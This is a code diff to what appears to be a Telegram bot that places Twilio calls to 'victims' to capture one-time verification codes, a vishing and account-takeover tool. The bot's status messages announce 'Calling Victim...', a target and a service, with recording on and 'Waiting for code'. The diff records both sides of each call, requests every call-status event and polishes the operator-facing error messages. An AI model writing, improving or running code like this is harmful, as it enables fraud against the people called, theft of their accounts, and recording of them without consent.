@@ -41,7 +41,7 @@ def handle_call(message: Message):
         
         twiml_url = f"{TWILIO_APP_URL}/twilio/voice?service={service}&user_id={user_id}"
         
-        # Callback para cuando termine la llamada (y recibir la grabación)
+        # Callback URL for status updates
         status_callback_url = f"{TWILIO_APP_URL}/twilio/status?user_id={user_id}"
 
         call = twilio_client.calls.create(
@@ -49,14 +49,15 @@ def handle_call(message: Message):
             from_=TWILIO_NUMBER, 
             url=twiml_url, 
             method='POST',
-            record=True, # <--- 🔴 ESTO ACTIVA LA GRABACIÓN
-            recording_channels='dual', # Graba a ambos lados
+            record=True,                # Record the call
+            recording_channels='dual',  # Record both sides
             status_callback=status_callback_url, 
-            status_callback_event=['completed']
+            # 👇 IMPORTANT: We request alerts for ALL events (Ringing, Answered, Completed)
+            status_callback_event=['initiated', 'ringing', 'answered', 'completed']
         )
         
         bot.edit_message_text(
-            f"📞 **Calling Victim...**\n\n🎯 Target: `{target}`\n🏢 Service: `{service}`\n🔴 **Recording:** ON\n\n_⚠️ Waiting for code..._", 
+            f"📞 **Calling Victim...**\n\n🎯 Target: `{target}`\n🏢 Service: `{service}`\n🔴 **Recording:** ON\n\n_⚠️ Waiting for answer..._", 
             chat_id=chat_id,
             message_id=msg.message_id,
             parse_mode="Markdown"
@@ -65,6 +66,6 @@ def handle_call(message: Message):
     except Exception as e:
         error_msg = str(e)
         if "unverified" in error_msg.lower():
-            bot.reply_to(message, "❌ **Twilio Trial Error:** Verify the number first.")
+            bot.reply_to(message, "❌ **Twilio Trial Error:** You can only call verified numbers.\nCheck your Twilio Console.")
         else:
             bot.reply_to(message, f"❌ **Call Failed:** `{error_msg}`", parse_mode="Markdown")
